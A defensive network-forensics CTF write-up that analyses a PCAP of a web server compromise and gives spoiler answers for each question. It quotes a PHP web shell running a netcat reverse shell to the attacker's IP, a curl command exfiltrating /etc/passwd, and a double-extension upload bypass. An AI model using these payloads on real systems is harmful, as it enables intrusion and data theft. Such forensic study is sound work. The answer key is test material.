---
platform: "cyberdefenders"
title: "WebStrike"
category: "Network Forensics"
difficulty: "Easy"
date: 2025-06-16
tags:
  - Wireshark
  - File Upload
  - Initial Acess
  - Execution
  - Persistence
  - Command and Control
  - Exfiltration
---

# WebStrike Lab

_Lab URL: https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/_

## Description
> Analyze network traffic using Wireshark to investigate a web server compromise, identify web shell deployment, reverse shell communication, and data exfiltration.

## Scenario
A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.

Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.

## Questions 6/6

### Question 1

> Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?

_💡 Note: The lab machines do not have internet access. To look up the IP address and complete this step, use an IP geolocation service on your local computer outside the lab environment._

IP geolocation is the process of resolving an IP address to a physical region, country, city, coordinates, and often the ISP behind it. For a defender, that mapping supports geo-blocking decisions, feeds threat intelligence correlation, and helps tie observed activity to regions known for specific threat actors or campaigns.

To find out who is talking to the web server, the first stop in Wireshark is the endpoint summary. After loading the PCAP, open **Statistics → Endpoints** and switch to the **IPv4** tab. This view lists every IPv4 address that appeared in the capture along with packet counts and byte volumes on each direction.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776563006/Writeups/Cyberdefenders/WebStrike/53e08e9e-bf85-40b2-ba7d-f14efe59a55d.png)

Two addresses dominate the traffic: **117.11.88.124** on one side and **24.49.63.79** on the other. Since `24.49.63.79` is the victim web server, the external host `117.11.88.124` is the one we care about. Through the image above it is also possible to see that `117.11.88.124` initiated the TCP Three-Way-Handshake, confirming that, in this case, it is the client.

Running that IP through a geolocation lookup, for example, `ipinfo.io`, places it in **Tianjin, China**.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776563111/Writeups/Cyberdefenders/WebStrike/012dd5a8-7584-4c39-b4ec-105ce9dec6a2.png)

With the origin identified, a perimeter defender can decide whether blanket geo-blocking from that region is appropriate, or whether narrower filtering on the specific address and its known infrastructure is enough.

#### Answer

<spoiler>
Tianjin
</spoiler>

### Question 2

> Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?

The User-Agent header is a string the client attaches to every HTTP request to describe itself, typically the browser family, rendering engine, version, and underlying operating system. Servers historically used it for content negotiation; defenders use it as a lightweight fingerprint. Attackers frequently forge User-Agent strings that look like common browsers to slip past naive filters, which is exactly why monitoring uncommon or inconsistent values is a useful detection signal.

To pull the attacker's User-Agent out of the capture, right-click an HTTP packet coming from `117.11.88.124` and choose **Follow → HTTP Stream**.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776563401/Writeups/Cyberdefenders/WebStrike/15042cdf-5438-4e0d-8115-082f5c8f602c.png)

The reassembled GET request exposes the following header:

```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

The attacker is presenting as Firefox 115 on 64-bit Linux. It is a plausible string on its own, but combined with the source IP it gives us a specific signature we can carry forward into IDS rules or SIEM queries to catch repeat attempts from the same tooling.

#### Answer

<spoiler>
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</spoiler>

### Question 3

> We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?

A web shell is a server-side script dropped on a vulnerable application that hands the attacker an interactive foothold. They are usually written in whatever language the server already runs: PHP, ASP, JSP, and are used to execute commands, stage further tooling, or pivot deeper into the network. Spotting one in a capture typically means finding either the upload itself or the traffic it generates afterward.

To narrow the view to upload attempts, I applied the following display filter in Wireshark:

```
ip.src == 117.11.88.124 && http.request.method == "POST"
```

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776564079/Writeups/Cyberdefenders/WebStrike/06ff87da-7aa3-432b-99c1-8a8b56777f49.png)

Two POST requests to `/reviews/upload.php` show up. The first one tries to push a file called `image.php` whose body contains PHP that calls `system()` to spawn a reverse shell. The server rejects it with an **"Invalid file format"** response, which means there is at least some server-side validation on extensions or MIME types.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776564188/Writeups/Cyberdefenders/WebStrike/1caed39d-3ba8-49e7-86d1-78da61c0f807.png)

The second attempt is the same payload, but with a small twist: the filename is now `image.jpg.php`. That double extension is enough to satisfy whatever check the server was doing, likely a loose test that only looked for `.jpg` anywhere in the name, and this time the server answers with **"File uploaded successfully"**.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776564306/Writeups/Cyberdefenders/WebStrike/c825d76d-7593-49d0-8779-55bd7d7c42fc.png)

The bypass is classic: when extension filtering is implemented as a substring check rather than a strict last-extension check, appending a permitted extension before the executable one tricks the filter while Apache still happily executes the file as PHP.

#### Answer

<spoiler>
image.jpg.php
</spoiler>

### Question 4

> Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?

Knowing the destination folder matters for response: it tells you where to hunt for dropped artifacts, which path to quarantine, and which URL patterns to block at the WAF. The intake endpoint `/reviews/upload.php`, only processes submissions; the files themselves have to be written somewhere reachable for the attacker to execute.

Looking further down the HTTP conversation, the attacker makes a follow-up GET request to `/reviews/uploads`. The server responds with **301 Moved Permanently**, rewriting the request to `/reviews/uploads/` (with the trailing slash).

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776565678/Writeups/Cyberdefenders/WebStrike/240890a8-6e36-424a-8753-89e36304e9aa.png)

That redirect is the confirmation we need. Anything pushed through `upload.php`, including `image.jpg.php`, ends up inside `/reviews/uploads/`, which is also directly accessible over HTTP. That public reachability is what lets the attacker trigger the shell by simply requesting its URL.

#### Answer

<spoiler>
/reviews/uploads/
</spoiler>

### Question 5

> Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?

Once the shell is planted on disk, the attacker still needs a way to drive it interactively. A reverse shell flips the direction of the TCP connection, the victim initiates the outbound session back to the attacker. Egress rules on most networks are far more permissive than ingress rules, so this pattern routinely succeeds where a direct bind shell would not.

The relevant detail lives inside the `image.jpg.php` body captured earlier:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

This is a textbook netcat reverse shell built on a named pipe. The FIFO at `/tmp/f` shuttles data between `/bin/sh -i` and `nc`, which dials out to the attacker at `117.11.88.124` on port **8080**. That is the port the operator is listening on, and therefore the one to focus egress monitoring on going forward.

#### Answer

<spoiler>
8080
</spoiler>

### Question 6

> Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

With the shell channel identified, the next step is to read what was actually typed into it. I narrowed the traffic to the reverse shell leg with:

```
tcp.port == 8080 && ip.src == 24.49.63.79
```
![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776566357/Writeups/Cyberdefenders/WebStrike/07175255-2c45-4b84-8fe2-cdfd94140c47.png)

This isolates data flowing from the victim back to the operator, essentially a transcript of the session from the server's point of view. Following the TCP stream gives a readable view of the command history.

![](https://res.cloudinary.com/a88188f90768a608fc75048188ef19e7/image/upload/q_auto/f_auto/v1776566471/Writeups/Cyberdefenders/WebStrike/06a2ac20-b2d7-4e73-9a1c-c0808e9de64a.png)

Within that stream, one line is the payoff:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

The attacker uses `curl` to POST the contents of `/etc/passwd` to their own host. Port `443` here is just a listener choice — the URL scheme is plain `http://`, so this is not TLS, the operator is simply reusing a well-known port number that is likely to be allowed outbound.

`/etc/passwd` no longer carries password hashes on modern Linux, those moved to `/etc/shadow` years ago, but it still reveals local usernames, UIDs, login shells, and service accounts. That is excellent reconnaissance material: it tells the attacker which accounts to target next, which users have interactive shells, and what kind of services the host runs.

#### Answer

<spoiler>
passwd
</spoiler>